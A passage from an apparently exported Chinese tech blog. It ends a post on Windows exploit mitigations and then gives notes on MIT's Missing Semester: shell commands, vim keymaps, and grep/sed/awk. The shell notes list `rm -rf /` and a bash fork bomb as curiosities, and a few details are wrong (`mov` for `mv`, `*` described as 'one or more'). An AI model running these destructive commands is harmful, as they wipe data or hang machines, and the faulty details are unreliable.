<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONFIG_CFI_CLANG=y</span><br></pre></td></tr></table></figure>


<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>与 Linux 相同，ASLR 保护指的是地址随机化技术(Address Space Layout Randomization)，这项技术将在程序启动时将 DLL 随机的加载到内存中的位置，这将缓解恶意程序的加载。ASLR 自 Windows 10 开始已经在系统中被配置为默认启用。</p>
<h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><p>Data Execute Protector</p>
<h3 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h3><p>这个保护类似于 Linux 中的 Canary 保护，一旦开启，会在返回地址和 BP 之前压入一个额外的 <strong>Security Cookie</strong>。系统会比较栈中的这个值和原先存放在 .data 中的值做一个比较。如果两者不吻合，说法栈中发生了溢出。</p>
<h3 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h3><p>DLL 混淆级保护。</p>
<h3 id="Isolation"><a href="#Isolation" class="headerlink" title="Isolation"></a>Isolation</h3><p>被称为隔离保护，一旦开启，表示此程序加载时将会在一个相对独立的隔离环境中被加载，从而阻止攻击者过度提升权限。</p>
<h3 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h3><p>结构化异常处理（Structured Exception Handling，简称 SEH）是一种 <code>Windows</code> 操作系统对错误或异常提供的处理技术。为Windows 的程序设计者提供了程序错误或异常的处理途径，使得系统更加健壮。</p>
<h3 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h3><p>安全结构化异常处理函数，即白名单安全沙箱，事先定义一些异常处理程序，并基于此构造安全结构化异常处理表，程序正式运行后，安全结构化异常处理表之外的异常处理程序将会被阻止运行。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/readme/">CTF-wili</a></li>
<li><a href="https://source.android.google.cn/docs/security/test/cfi?hl=zh-cn">android CFI</a></li>
<li><a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">Control Flow Integrity — Clang</a></li>
<li><a href="https://www.cnblogs.com/pwnfeifei/p/17162374.html">windows pwn</a></li>
<li><a href="https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/">Windows_Pwn学习</a></li>
</ul>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>程序缓解机制</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机教育缺失的一课</title>
    <url>/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/</url>
    <content><![CDATA[<blockquote>
<p>the Missing Semester of your CS education</p>
</blockquote>
<span id="more"></span>

<ul>
<li><p>The Missing Semester of your CS education，共<code>11</code>节课，每节课约1h。</p>
<ul>
<li><a href="https://www.bilibili.com/video/BV1uc411N7eK/?spm_id_from=333.999.0.0&vd_source=ccaa27461534d3a4a5e9b964672f86d6">bilibili 双语字幕</a></li>
<li><a href="https://www.youtube.com/playlist?list=PLyzOVJj3bHQuloKGG59rS43e29ro7I57J">Missing Semester IAP 2020</a></li>
</ul>
</li>
<li><p>确实不错，手敲命令+讲解。多使用Linux</p>
</li>
<li><p>学校应该在大一教这个，而不是TM的大学物理</p>
</li>
<li><p>课程网站</p>
</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://missing.csail.mit.edu/</span><br></pre></td></tr></table></figure>

<h2 id="lectrue1-overview-shell"><a href="#lectrue1-overview-shell" class="headerlink" title="lectrue1: overview &amp; shell"></a>lectrue1: overview &amp; shell</h2><blockquote>
<p>主要是 Linux 基本命令</p>
</blockquote>
<h3 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h3><ul>
<li>如何利用存在的工具使我们开发更加高效，以及如何更好的利用我们的计算机，这是这门课主要解决的问题。</li>
</ul>
<h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><ul>
<li>讲述了Linux Shell.主要是bash</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">shell是运行在终端中的文本互动程序，bash（GNU Bourne-Again Shell）是最常用的一种shell。是当前大多数Linux发行版的默认Shell。</span><br></pre></td></tr></table></figure>

<ul>
<li>日期</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">date</span></span><br></pre></td></tr></table></figure>

<ul>
<li>打印</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>路径列表</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 当我们执行一些命令时，会遍历PATH寻找；比如说使用 /bin/echo 时只需在终端输入 echo 就行</span></span><br><span class="line"><span class="comment"># `:` 分隔</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<ul>
<li>寻找命令的路径</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">which</span> <span class="built_in">echo</span></span><br><span class="line">/usr/bin/echo</span><br><span class="line"></span><br><span class="line"><span class="comment"># whereis可以寻找到 原始代码、二进制文件，或是帮助文件</span></span><br><span class="line">$ whereis bash</span><br><span class="line">bash: /usr/bin/bash /usr/share/man/man1/bash.1.gz</span><br></pre></td></tr></table></figure>

<ul>
<li>目录</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># change dir</span></span><br><span class="line">$ <span class="built_in">cd</span> /home/username</span><br><span class="line"></span><br><span class="line"><span class="comment"># `..` 代表上一级目录。`.` 代表当前目录 </span></span><br><span class="line">$ <span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># `-`  当前目录和之前目录下切换</span></span><br><span class="line">$ <span class="built_in">cd</span> /mnt</span><br><span class="line">$ <span class="built_in">cd</span> /home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有趣的一点是，`..`使用过多的情况。`/`目录没有上一级，最高只能到 `/`</span></span><br><span class="line">$ ../../../../../../bin/date</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure>

<ul>
<li>文件操作</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  list: 列出指定目录下所有的文件，默认当前目录</span></span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">test.txt</span><br><span class="line">$ <span class="built_in">ls</span> /</span><br><span class="line">lib root home ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移动文件位置 move</span></span><br><span class="line">$ mov test.txt /tmp</span><br><span class="line">$ <span class="built_in">ls</span> /tmp</span><br><span class="line">test.txt</span><br><span class="line"><span class="comment"># 重命名</span></span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ mov test.txt tmp.txt</span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">tmp.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制 copy</span></span><br><span class="line">$ <span class="built_in">cp</span> tmp.txt tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line">$ <span class="built_in">rm</span> tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个文件</span></span><br><span class="line">$ <span class="built_in">touch</span> tmp2.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line">$ <span class="built_in">mkdir</span> tmpdir</span><br><span class="line">$ <span class="built_in">rmdir</span> <span class="comment"># rm -r 也行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件所有内容</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt</span><br><span class="line">hello world</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件开头结尾，默认10行</span></span><br><span class="line">$ <span class="built_in">head</span> test.txt</span><br><span class="line">$ <span class="built_in">tail</span> test.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat 重定向</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt; tmp.txt   <span class="comment"># 如果没有就创建tmp.txt.</span></span><br><span class="line">$ <span class="built_in">cat</span> &lt; text.txt &gt; tmp.txt <span class="comment"># 同上</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt;&gt; tmp.txt  <span class="comment"># &gt; 会清除原先内容。&gt;&gt; 代表append，追加而不清除</span></span><br></pre></td></tr></table></figure>

<ul>
<li>命令参数和帮助文档</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一般命令也存在参数，一般为 -?</span></span><br><span class="line">$ <span class="built_in">ls</span> -l  /home</span><br><span class="line"><span class="comment"># d: dir rwx: 权限Read, Write, eXecute(也代表是否能够访问此目录)。</span></span><br><span class="line"><span class="comment"># 从前到后: owner权限 group权限 其余用户权限 owner group size date dir_name</span></span><br><span class="line">drwxr-x--- 27 user user 4096 Jun 21 14:42 user  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查帮助文档，q退出。manual pages</span></span><br><span class="line">$ man <span class="built_in">ls</span> </span><br><span class="line"> -l     use a long listing format</span><br></pre></td></tr></table></figure>

<ul>
<li>管道：左侧的输出作为右侧的输入</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> / | <span class="built_in">tail</span> -n 1 <span class="comment"># -n 1 最后一行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有时候给root权限文件写入时，比如sudo echo 123 &gt; tmp.txt会报错，可用以下命令</span></span><br><span class="line">$ <span class="built_in">echo</span> 123 | sudo <span class="built_in">tee</span> tmp.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>root user: 超级管理员。尽量少用，在运行错误的程序时会破坏计算机。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用户使用root权限</span></span><br><span class="line">$ sudo &lt;commond&gt;</span><br><span class="line"></span><br><span class="line">$ sudo su</span><br><span class="line">password: xxx</span><br><span class="line">root<span class="comment"># `#` 代表root 权限 </span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>/sys</code> 文件夹：各种内核参数，显示设备的状态。linux系统将其视为文件暴漏给用户，意味着我们可以操作从而控制某些设备</p>
</li>
<li><p>有趣的命令</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删库跑路，无需确认强制删除所有的文件</span></span><br><span class="line">$ <span class="built_in">rm</span> -rf /</span><br><span class="line"></span><br><span class="line"><span class="comment"># fork 炸弹, 会耗尽电脑资源</span></span><br><span class="line">$ :()&#123; :|:&amp; &#125;;:  <span class="comment"># 理解为一个函数递归调用 `:` 为函数名</span></span><br><span class="line">:() &#123;</span><br><span class="line">	: | :&amp;</span><br><span class="line">&#125;;</span><br><span class="line">:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于ls打错频率比较高，会出现一个动画(火车)</span></span><br><span class="line">sl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># cowsay 打印一段话 cowthink 类似，但是think</span></span><br><span class="line">cowsay <span class="string">&quot;nb&quot;</span></span><br><span class="line">	-l 查看动物，需要安装</span><br><span class="line">	-f 指定动物</span><br><span class="line"> ____</span><br><span class="line">&lt; nb &gt;</span><br><span class="line"> ----</span><br><span class="line">        \   ^__^</span><br><span class="line">         \  (oo)\_______</span><br><span class="line">            (__)\       )\/\</span><br><span class="line">                ||----w |</span><br><span class="line">                ||     ||</span><br><span class="line"></span><br><span class="line"><span class="comment"># figlet 字符字  toilet类似 </span></span><br><span class="line">figlet love</span><br><span class="line"> <span class="string">&quot;&quot;</span><span class="comment">#</span></span><br><span class="line">   <span class="comment">#     mmm   m   m   mmm</span></span><br><span class="line">   <span class="comment">#    #&quot; &quot;#  &quot;m m&quot;  #&quot;  #</span></span><br><span class="line">   <span class="comment">#    #   #   #m#   #&quot;&quot;&quot;&quot;</span></span><br><span class="line">   <span class="string">&quot;mm  &quot;</span><span class="comment">#m#&quot;    #    &quot;#mm&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印一堆信息和logo，装b使用</span></span><br><span class="line">neofetch</span><br></pre></td></tr></table></figure>

<ul>
<li>现代化的命令：开发者使用rust写了很多更加现代的命令，可以替代一些老命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exa  =&gt;  <span class="built_in">ls</span></span><br><span class="line">bat  =&gt;  <span class="built_in">cat</span> </span><br></pre></td></tr></table></figure>

<h4 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><ul>
<li>shell, console, terminal?</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">xxx</span><br></pre></td></tr></table></figure>

<h2 id="lectrue2-shell-script"><a href="#lectrue2-shell-script" class="headerlink" title="lectrue2: shell script"></a>lectrue2: shell script</h2><blockquote>
<p>Linux 脚本的使用</p>
</blockquote>
<ul>
<li>语法</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$0</span>      运行文件名</span><br><span class="line"><span class="variable">$1</span>-<span class="variable">$9</span>   参数</span><br><span class="line">$?      获取上一个运行的错误 0代表正确，1代表出错</span><br><span class="line"><span class="variable">$_</span>      存储上次运行的结果</span><br><span class="line"><span class="variable">$#</span>      参数个数</span><br><span class="line">$$      进程<span class="built_in">id</span></span><br><span class="line"><span class="variable">$@</span>      所有的参数组成，可迭代</span><br><span class="line"></span><br><span class="line">!!      在执行时会替换为上一个执行的命令</span><br><span class="line"><span class="comment"># 变量</span></span><br><span class="line">foo=bar</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$foo</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量赋值为命令的结果</span></span><br><span class="line">foo=$(<span class="built_in">pwd</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>循环</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> xxx; <span class="keyword">do</span>... <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<ul>
<li>条件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> xxx; then...fi</span><br></pre></td></tr></table></figure>

<ul>
<li>编程脚本</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加入magic line 指定解析器</span></span><br><span class="line"><span class="comment"># 一个 称之为 `shebang` 的东西</span></span><br><span class="line"><span class="comment">#!/usr/bin/pyton3</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>man</code> 命令的其余选择 <code>tldr</code> ，更加简洁(too long; don’t read)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tldr tar</span><br></pre></td></tr></table></figure>

<ul>
<li>递归查询</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find .     <span class="comment"># . 代表当前路径，我们可以指定比如 `/` </span></span><br><span class="line">	-name  <span class="comment"># 名称,可以使用通配符</span></span><br><span class="line">	-<span class="built_in">type</span>  <span class="comment"># 类型 d(dir) f(file)</span></span><br><span class="line">	-mtime -1 <span class="comment"># 修改时间modify time， 1指1天</span></span><br><span class="line">	-<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;   <span class="comment"># 对于寻找的文件执行命令 \; 不可缺少</span></span><br><span class="line"></span><br><span class="line">fd  <span class="comment"># 更加现代化的find</span></span><br><span class="line"></span><br><span class="line">locate  <span class="comment"># 默认查找整个计算机</span></span><br><span class="line"></span><br><span class="line">grep  <span class="comment"># 应用于查文件内容</span></span><br><span class="line">	-R  <span class="comment">#  递归</span></span><br><span class="line"></span><br><span class="line">rg  <span class="comment"># ripgrep</span></span><br></pre></td></tr></table></figure>


<ul>
<li>查找使用过的命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">方向键的上</span><br><span class="line"></span><br><span class="line">fzf</span><br><span class="line"></span><br><span class="line">zsh 的一个插件，在输入时会显示曾经输入的类似命令</span><br></pre></td></tr></table></figure>


<ul>
<li>更清晰的目录结构</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tree</span><br><span class="line">broot</span><br></pre></td></tr></table></figure>

<h2 id="lecture3-editor-VIM"><a href="#lecture3-editor-VIM" class="headerlink" title="lecture3: editor VIM"></a>lecture3: editor VIM</h2><ul>
<li><p>normal mode: 可以控制光标，执行命令…</p>
</li>
<li><p>insert mode: 就是文本编辑器。</p>
</li>
<li><p>command mode: 在insert mode 输入 <code>:</code> 在输入命令</p>
</li>
<li><p>visual mode: 有点像使用鼠标选中一块连续区域</p>
</li>
<li><p>replace mode</p>
</li>
<li><p>进入 insert mode</p>
</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">i   <span class="keyword">insert</span>， 在光标前插入</span><br><span class="line"><span class="keyword">a</span>   <span class="keyword">append</span>，在光标后</span><br><span class="line">I   行首</span><br><span class="line">A   行尾</span><br><span class="line"><span class="keyword">o</span>   下一行 <span class="keyword">open</span> <span class="keyword">a</span> <span class="keyword">new</span> <span class="built_in">line</span></span><br><span class="line">O   上一行</span><br></pre></td></tr></table></figure>

<ul>
<li>normal mode</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">esc  也可以自行配置</span><br></pre></td></tr></table></figure>

<ul>
<li><p>保存，退出</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">-- <span class="keyword">write</span> <span class="keyword">quit</span></span><br><span class="line"><span class="keyword">normal</span> <span class="keyword">mode</span> 下 :<span class="keyword">wq</span></span><br><span class="line"></span><br><span class="line">-- 加入 ! 代表强制执行</span><br></pre></td></tr></table></figure>
</li>
<li><p>normal mode 光标操作。</p>
<ul>
<li>所有的都可以在<code>前面加一个数字</code>，代表count</li>
</ul>
</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">h   左移</span><br><span class="line"><span class="keyword">j</span>   下</span><br><span class="line"><span class="keyword">k</span>   上</span><br><span class="line"><span class="keyword">l</span>   右</span><br><span class="line"></span><br><span class="line"><span class="keyword">w</span>   向前(后一个单词)移动一个 word, 也就是一个单词，标点或者空格分开。在单词第一个字母</span><br><span class="line"><span class="keyword">b</span>   向back移动 word      back of word</span><br><span class="line"><span class="keyword">e</span>   移动到单词末尾        end of word</span><br><span class="line"><span class="number">0</span>   移动到行首</span><br><span class="line">$   行尾</span><br><span class="line">^   一行第一个非空字符</span><br><span class="line"></span><br><span class="line">ctrl-<span class="keyword">u</span>     <span class="keyword">up</span>类似鼠标向上滚动</span><br><span class="line">ctrl-d     down 向下</span><br><span class="line"></span><br><span class="line">H  highest  屏幕第一行</span><br><span class="line">L  low      屏幕最后一行</span><br><span class="line">M  mid      屏幕中间一行</span><br></pre></td></tr></table></figure>

<p>删除</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">d  删除一个字符,配合移动光标使用</span><br><span class="line">	dd 删除一行，可以使用<span class="keyword">p</span></span><br><span class="line">	D 删除至末尾</span><br><span class="line">	d1G 删除到第一行</span><br><span class="line">	dG  删除到最后一行</span><br><span class="line">	n1, n2d 删除n1-n2行</span><br><span class="line">	-- 在这里 <span class="keyword">a</span> around;  i inside</span><br><span class="line">	<span class="keyword">di</span>(  删除括号内的内容</span><br><span class="line">	da(  删除包括括号的东西</span><br><span class="line"><span class="keyword">c</span>   <span class="keyword">change</span> <span class="keyword">a</span> word 删除(d 类似)并进入<span class="keyword">insert</span> <span class="keyword">mode</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">x</span>   删除后面一个字符</span><br><span class="line">	<span class="symbol">&lt;num&gt;</span><span class="keyword">x</span> 删除后面num个字符</span><br><span class="line">s   删除字符进入<span class="keyword">insert</span> <span class="keyword">mode</span></span><br><span class="line">S   删除一行进入<span class="keyword">insert</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure>

<ul>
<li>复制粘贴</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">y</span>   <span class="keyword">yank</span> </span><br><span class="line">	yy 复制当前行</span><br><span class="line">	y1G ...</span><br><span class="line"><span class="keyword">p</span>   paste在这一行后面</span><br><span class="line"><span class="keyword">P</span>   这一行前面</span><br></pre></td></tr></table></figure>

<ul>
<li>跳转到某一行</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">g</span><br><span class="line">	gg 第一行</span><br><span class="line">G   最后一行</span><br><span class="line">	<span class="symbol">&lt;num&gt;</span>G  跳转到num行</span><br><span class="line">:<span class="symbol">&lt;num&gt;</span>   跳到第num行</span><br></pre></td></tr></table></figure>

<ul>
<li>撤销之前的操作</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">u</span> <span class="keyword">undo</span></span><br><span class="line">ctrl + r   <span class="keyword">redo</span> 恢复撤销的内容</span><br></pre></td></tr></table></figure>

<ul>
<li>visual mode: 允许我们改变一列，整块复制等</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">v   字符可视，开始和结束两个字符中间所有内容，退出按v</span><br><span class="line">V   行可视行，光标所在行，退出 V</span><br><span class="line">ctrl+v   块可视，开始和结束光标的矩阵，退出ctrl+v</span><br></pre></td></tr></table></figure>

<ul>
<li>搜索</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">f</span><span class="symbol">&lt;word&gt;</span>  本行查找</span><br><span class="line">/<span class="symbol">&lt;word&gt;</span>  查内容,全文</span><br><span class="line">n      继续向下继续找 <span class="keyword">next</span></span><br><span class="line"><span class="keyword">N</span>      继续向上找</span><br></pre></td></tr></table></figure>

<ul>
<li>更改环境</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:<span class="keyword">set</span> <span class="keyword">nu</span>   显示行号</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>~</code> 反转大小写</p>
</li>
<li><p>括号匹配</p>
</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">%   到匹配的另一个括号处</span><br></pre></td></tr></table></figure>

<ul>
<li>tab, window, buffer</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">tab: 我理解为 在系统中打开vim这个软件两次，就是两个tab</span><br><span class="line"></span><br><span class="line">window: vim 屏幕，可以分屏</span><br><span class="line"></span><br><span class="line">buffer: 打开文件，文件具有buffer, 同一个文件同一个buffer,实时。</span><br></pre></td></tr></table></figure>

<ul>
<li>配置，vim 在执行前会加载一个 <code>~/.vimrc</code> 文件。<ul>
<li>我们可以DIY自己的喜欢的按键。</li>
<li>安装插件实现更多的功能</li>
</ul>
</li>
</ul>
<h3 id="neovim"><a href="#neovim" class="headerlink" title="neovim"></a>neovim</h3><ul>
<li>本人使用 <a href="https://neovim.io/">neovim</a> 配合 <a href="https://www.lazyvim.org/">LazyVim</a>。可DIY. 然后再 <code>VsCode</code> 安装neovim插件，同步使用。</li>
<li>常用的操作，neovim也能用。</li>
</ul>
<h4 id="keymap"><a href="#keymap" class="headerlink" title="keymap"></a>keymap</h4><ul>
<li><p>Leader 为 space 键，挺好用, 使用这些功能也需要安装对应插件</p>
</li>
<li><p>打开终端</p>
</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>ft   当前</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fT   /</span><br><span class="line"></span><br><span class="line">ctrl-/    打开和关闭</span><br></pre></td></tr></table></figure>

<ul>
<li>快速注释</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>gc    但是需要指定的 LSP</span><br></pre></td></tr></table></figure>

<ul>
<li>不同文件间(buffer)切换</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>bb</span><br></pre></td></tr></table></figure>

<ul>
<li>文件搜索 telescope</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">-- 文件名</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="symbol">&lt;leader&gt;</span>   <span class="symbol">&lt;esc&gt;</span><span class="symbol">&lt;esc&gt;</span> 退出</span><br><span class="line"></span><br><span class="line">-- 文件内容</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">sb</span></span><br></pre></td></tr></table></figure>

<ul>
<li>文件内</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;c-s&gt;</span> 保存文件</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fn  <span class="keyword">new</span> <span class="keyword">file</span></span><br></pre></td></tr></table></figure>

<ul>
<li>分屏</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">w</span>|  <span class="symbol">&lt;leader&gt;</span>|  生动表示竖着</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">w</span>-  <span class="symbol">&lt;leader&gt;</span>-  横着</span><br><span class="line"></span><br><span class="line">-- 切换，和<span class="keyword">normal</span> <span class="keyword">mode</span> 下的移动联系</span><br><span class="line"><span class="symbol">&lt;C-h&gt;</span> 左</span><br><span class="line"><span class="symbol">&lt;C-j&gt;</span> 下</span><br><span class="line"><span class="symbol">&lt;C-k&gt;</span> 上</span><br><span class="line"><span class="symbol">&lt;C-l&gt;</span> 右</span><br></pre></td></tr></table></figure>

<ul>
<li>侧边栏 neo-tree</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>fe   当前</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fE   /</span><br><span class="line"></span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">e</span>   当前</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>E   /</span><br><span class="line"></span><br><span class="line">-- 侧边栏进入文件后，在进入侧边栏</span><br><span class="line"><span class="symbol">&lt;C-h&gt;</span> </span><br><span class="line"><span class="symbol">&lt;C-l&gt;</span> </span><br></pre></td></tr></table></figure>

<ul>
<li>lazy.nvim 插件管理非常受欢迎。作者开发的插件和配置。</li>
</ul>
<h2 id="lecture4-data-wrangling"><a href="#lecture4-data-wrangling" class="headerlink" title="lecture4: data wrangling"></a>lecture4: data wrangling</h2><blockquote>
<p>处理数据的某些手段</p>
</blockquote>
<ul>
<li>grep，搜索</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;word&quot;</span> tmp.txt   <span class="comment"># 查询</span></span><br><span class="line">	-R  <span class="comment"># 递归，可以查找文件夹下的文件</span></span><br></pre></td></tr></table></figure>

<ul>
<li>sed，在搜索替换是一个好用的工具。需要学习一下正则表达式</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/&lt;pattern&gt;/&lt;replace&gt;/&#x27;</span></span><br><span class="line">pattern: 匹配模式，支持正则表达式</span><br><span class="line">replace: 将匹配到的pattern 转换为 replace。当捕获时 \num 代表第num个捕获，打印</span><br><span class="line"></span><br><span class="line"><span class="comment"># sed 默认支持很老的正则表达式，使用 `-E` 参数，支持现代化的正则</span></span><br></pre></td></tr></table></figure>

<ul>
<li>一些正则表达式使用，使用在线网站练习。regular expression</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[0-9]   0,1,2...9 其中一个数字</span><br><span class="line">*       贪婪模式，1次或多次</span><br><span class="line">?       0 或 1 次</span><br><span class="line">.       任意字符</span><br><span class="line">()      捕获括号内的内容</span><br><span class="line">^ 开头   $ 末尾</span><br></pre></td></tr></table></figure>

<ul>
<li>wc</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wc</span> -l    word count,统计大小 -l line 几行</span><br></pre></td></tr></table></figure>

<ul>
<li><p>排序，字典序。去重</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span>    默认字典序排序</span><br><span class="line">	-n 按照数值的大小进行排序</span><br><span class="line">	-k 指定排序的列数</span><br><span class="line"><span class="built_in">uniq</span>    可去除重复内容</span><br><span class="line">	-c  记录出现次数</span><br></pre></td></tr></table></figure>
</li>
<li><p>awk，基于流的处理，是一门编程语言</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;script&#x27;</span>  执行一个脚本</span><br><span class="line">awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">	-F  指定分隔符</span><br></pre></td></tr></table></figure>

<ul>
<li>cut，类似编程语言的split</li>
</ul>
